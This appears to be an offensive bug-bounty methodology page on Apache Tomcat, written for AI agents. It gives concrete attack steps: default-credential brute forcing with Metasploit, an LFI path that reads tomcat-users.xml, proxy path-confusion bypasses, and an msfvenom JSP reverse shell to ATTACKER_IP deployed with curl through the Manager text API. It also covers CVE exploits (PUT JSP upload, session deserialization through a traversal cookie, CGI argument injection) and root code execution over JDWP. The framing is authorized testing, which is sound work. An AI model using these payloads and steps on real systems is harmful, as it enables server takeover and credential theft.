---
technology: "Apache Tomcat"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "14 files (see ../internal coverage ledger)"
provenance: "mined from 14 evidence files + upstream-verified 2026-11-12: Apache Tomcat 9 Manager App How-To (role matrix, manager disabled by default, text-interface commands), NVD + JPCERT CVE-2017-12615/12617 (PUT JSP upload), NVD + oss-security + CSA-SG CVE-2020-9484 (session persistence deserialization, four prerequisites), NVD CVE-2019-0232 (Windows CGI args injection), Rapid7 + OffSec Metasploit Unleashed (auxiliary/scanner/http/tomcat_mgr_login defaults), github.com/mgeeky/tomcatWarDeployer (tool exists, JSP backdoor generator). AJP/Ghostcat gates: cross-referenced from this vault's ajp unit (verified there)."
---

Companion page: [[tomcat|Apache Tomcat overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Apache Tomcat Bug Bounty Methodology

**Scope:** Tomcat the container — Manager app, host-manager, WAR deployment, JSP execution, connector-adjacent CVEs — plus the config-file and JVM surfaces around it. **Out of scope:** AJP protocol internals (ajp unit), the Java deserialization gadget chains themselves (java-rmi/deserialization surfaces), products merely hosted on Tomcat (their own units).

**Authorization:** presume written permission. Default-credential brute on the Manager is noisy and lockout-prone; WAR deployment writes to disk and spawns a process — in production treat deploy as a demonstrated-but-not-executed step unless the program explicitly allows RCE proof.

## Decision tree (one screen)

1. Banner/landing page confirms Tomcat + version → Phase 1.
2. `/manager` reachable + no creds → Phase 2 (cred acquisition: brute, file read, leaks, proxy bypass).
3. Manager creds or bypass → Phase 3 (WAR deploy = shell as tomcat user) → Phase 6 (loot/privesc).
4. Manager closed but version in a core-CVE window → Phase 4 (PUT JSP / session deser / CGI / Ghostcat-via-8009).
5. Already on the box → Phase 5 (JVM flags, tomcat-users.xml, webapp deserialization).

## Phase 1 — Fingerprinting

```bash
curl -s http://example.com:8080/does_not_exist   # 404 page carries "Apache Tomcat/9.0.31"
nmap -sC -sV example.com                         # "8080/tcp open http Apache Tomcat 10.1.19" / "Apache-Coyote/1.1"
```

Observed tells: the Debian landing page prints CATALINA_HOME (`/usr/share/tomcat9`) and CATALINA_BASE (`/var/lib/tomcat9`) plus the tomcat9-docs/examples/admin package list — free layout recon. `/manager/status` and 404 pages both carry the version. Changelog-hunt the exact version: read the fixes between it and the next release (9.0.31 → 9.0.35 deserialization fix note observed). nmap's `-sV` already versions it (9.0.38, 10.1.19, and 8.5.37 banners all observed).

## Phase 2 — Reaching the Manager (four observed routes)

**Route A — default credentials.** Metasploit `auxiliary/scanner/http/tomcat_mgr_login` with its default wordlists (`tomcat_mgr_default_users/pass/userpass.txt`, TARGETURI `/manager/html`):

```text
[-] LOGIN FAILED: tomcat:admin (Incorrect)
[-] LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] Login Successful: tomcat:s3cret      # (a classic default pair)
```

Try the role-relevant pairs first: `tomcat:tomcat`, `admin:admin`, `role1:role1`, `manager:manager`, `admin:s3cret`. Each failure is cheap; lockouts are the risk.

**Route B — read `conf/tomcat-users.xml`.** Any LFI/file-read primitive: the 401 error page names the file, and on Debian the path is `/usr/share/tomcat9/etc/tomcat-users.xml` (upstream tarball installs keep it at `$CATALINA_BASE/conf/`). Observed variants: web LFI (`/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml` — needed the `etc/` variant after a blank first guess), readable conf over a foothold (`conf/tomcat-users.xml` → admin/admin + a second password), ansible template `tomcat-users.xml.j2` (honest dead end there: passwords did not work and manager was not exposed; check anyway), distributed Docker/source package (the zip shipped a working plaintext password reused on SSH), post-shell `/opt/tomcat/conf/tomcat-users.xml`. The file also yields the **role matrix** (`manager-gui`, `manager-script`, `admin-gui`), telling you which interface to hit.

**Route C — proxy path-confusion when an ACL fronts the manager.** Tomcat normalizes `/..;/` and `;params`; nginx/Apache location blocks and mTLS checks match the raw path:

```text
http://example.com/anything/..;/manager/html        # 403'd direct, 200 via confusion (observed twice)
https://example.com/manager/test/..;/html/upload     # then deploy through the confused path (observed)
https://example.com/admin;foo=bar/dashboard          # matrix-param form; nginx sees ;..., tomcat strips it (observed)
```

One observed variant traversed into another webapp: `/hosting/..;/examples/servlets/` reached the default examples app's SessionExample servlet — session-attribute tampering (set `s_IsLoggedInUserRoleManager=true`) without any manager creds at all. Also fuzz for the manager when it is unlinked (ffuf found `/manager` on an unlinked install, observed).

**Route D — adjacent channels.** An exposed JMX/RMI port dumps configured Tomcat users (roles included) without touching HTTP (observed, via the java-rmi surface: `manager:<password>` with role list). Git repos and backups in scope may hold the manager password outright (observed — credentials in a repo's git log).

Role gates (upstream, Tomcat Manager How-To): `manager-gui` = HTML UI; `manager-script` = text API `/manager/text` + status; `manager-jmx` = JMX proxy + status ("effectively low-level root-like"); `manager-status` = status only; host-manager wants `admin-gui`/`admin-script`. A user without any `manager-*` role cannot deploy at all — check the matrix you leaked.

## Phase 3 — WAR deployment (creds → shell)

1. msfvenom payload: `msfvenom -p java/jsp_reverse_shell LHOST=ATTACKER_IP LPORT=4443 -f war -o shell.war` (or a hand-rolled JSP backdoor WAR).
2. Deploy — GUI: `/manager/html` upload form. Text API:

```bash
curl -u tomcat:«manager-password» --upload-file shell.war \
  "http://example.com:8080/manager/text/deploy?path=/shell"
```

3. Trigger `http://example.com:8080/shell/` (or the JSP inside) → shell as the `tomcat` user. Undeploy after: `/manager/text/undeploy?path=/shell` (Metasploit's tomcat_mgr_upload does deploy→stage→undeploy automatically — observed output shows the undeploy trail).

Tools in prose: Metasploit `exploit/multi/http/tomcat_mgr_upload` (default `java/meterpreter/reverse_tcp`, TARGETURI `/manager`), `auxiliary/scanner/http/tomcat_mgr_login` for Route A, and tomcatWarDeployer (mgeeky) — generates and deploys a JSP backdoor WAR plus command interface given manager creds; all are equivalent to the curl workflow above.

## Phase 4 — Version-gated core CVEs (verify the gate before firing)

- **CVE-2017-12615 / CVE-2017-12617 — PUT JSP upload** (readonly=false on the Default servlet). 12615: 7.0.0–7.0.79; 12617 (bypass of the 12615 patch): 9.0.0.M1–9.0.0, 8.5.0–8.5.22, 8.0.0.RC1–8.0.46, 7.0.0–7.0.81 (NVD/JPCERT; some bypass variants need Windows). Test: `PUT /shell.jsp/` (trailing slash/NUL/`%20` suffix variants) then GET it. Requires the admin to have set `readonly=false` — rare in the wild, instant shell when present.
- **CVE-2020-9484 — session-persistence deserialization.** 10.0.0-M1–M4, 9.0.0.M1–9.0.34, 8.5.0–8.5.54, 7.0.0–7.0.103 (fixed 10.0.0-M5/9.0.35/8.5.55/7.0.104). Four prerequisites (NVD): PersistenceManager with FileStore; `sessionAttributeValueClassNameFilter="null"` (default without SecurityManager); attacker controls a file's contents *and name* on the server; attacker knows the relative path from the FileStore dir. Observed chain (9.0.27): upload file `f` via the app → set cookie `JSESSIONID=../../../../../../../opt/samples/uploads/f` (Tomcat appends `.session`) → CommonsCollections2 payload deserialized → shell as tomcat. Incomplete-fix follow-ups: CVE-2021-25329, TOCTOU CVE-2022-23181 (upstream changelog).
- **CVE-2019-0232 — CGI servlet args injection.** Windows only, 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93, with the CGI servlet (disabled by default) *and* `enableCmdLineArguments` enabled: query-string args reach `CreateProcess` via .bat/.cmd quoting rules → RCE. CGI being enabled at all is the finding; report it.
- **Ghostcat (CVE-2020-1938)** — AJP-only; see the ajp unit in this vault for gates (≤9.0.30/8.5.50/7.0.99) and the file-read mechanics. On a Tomcat with 8009 open, Ghostcat is often the cheaper pre-auth path to `WEB-INF/web.xml` compared to everything above.

## Phase 5 — Post-foothold on the box

- **Read the JVM flags**: `ps aux | grep java`. `-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y` on a root-owned Tomcat = JDWP attach via jdb (set a breakpoint in a servlet's `init()`, break → evaluate) → code exec as root (observed). Note you may be unable to read the config files as your user — the ps line still leaks paths and versions.
- **`tomcat-users.xml` everywhere you land**: `/opt/tomcat/conf/`, `/usr/share/tomcat9/etc/`, `/var/lib/tomcat9/` — plus backups (`.j2` templates, `web.xml.bak` holding JSF ViewState config). Passwords inside are reused on SSH/users more often than they are used on the manager itself (observed repeatedly).
- **Webapp deserialization on the Tomcat you already trust**: JSF ViewState RCE once the encryption key leaks from `web.xml.bak`-style files (MyFaces viewstate forging, observed), SnakeYAML `!!javax.script.ScriptEngineManager` URL objects (observed), crafted `mysql.host`-style jdbc URLs (observed). Tomcat's jars make the gadget libraries reachable.
- **webapps/ directory review**: list `/usr/local/tomcat/webapps/` for deployed WARs and pull them for source review — jd-gui decompile of `*.class` inside a WAR exposes authz logic (observed: hidden `s_IsLoggedInUserRoleManager` parameter). Note Debian split: `CATALINA_BASE` webapps vs `/usr/share/tomcat9` docs (the Debian landing page tells you which layout).

## Phase 6 — Disclosure notes

- Version-gate every core CVE claim against the banner AND the changelog (the observed method: next-version fix text). "Running 9.0.31" alone is a hypothesis until the changelog maps it.
- Manager access via path-confusion: the *proxy config* is the vulnerability (ACL bypass), even if you deploy nothing; report the confusion pair with raw request/response evidence.
- Default creds are a config finding; the WAR deploy proves impact — state which artifact you deployed, where, and that you undeployed.
- `tomcat-users.xml` disclosure severity = the blast radius of the reused passwords, not the file itself; demonstrate the reuse (SSH as named user) before rating it critical.

## Appendix A — Tool mapping (prose)

- **nmap** (`-sC -sV`) — banner/version, favicon, service detection; the entry point for Phase 1.
- **curl** — 401 page recon, `/manager/text` deploy/undeploy API, PUT-JSP PoCs, path-confusion probes.
- **Metasploit** — `auxiliary/scanner/http/tomcat_mgr_login` (default-cred brute, built-in tomcat wordlists), `exploit/multi/http/tomcat_mgr_upload` (WAR deploy, java/meterpreter payloads).
- **tomcatWarDeployer** (mgeeky) — standalone WAR backdoor generator/deployer; alternative when Metasploit is off-menu.
- **msfvenom** — `java/jsp_reverse_shell` `-f war` payload packaging (also plain JSP by hand).
- **ffuf/gobuster** — manager/host-manager discovery when unlinked (observed).
- **jd-gui / jadx-class based decompilers** — WAR/class decompilation for webapp authz review (observed).
- **jdb** — JDWP attach against a debug-enabled Tomcat JVM (observed).
- **Burp Suite** — intercept the HTML manager upload (CSRF nonce capture) and replay deploys.
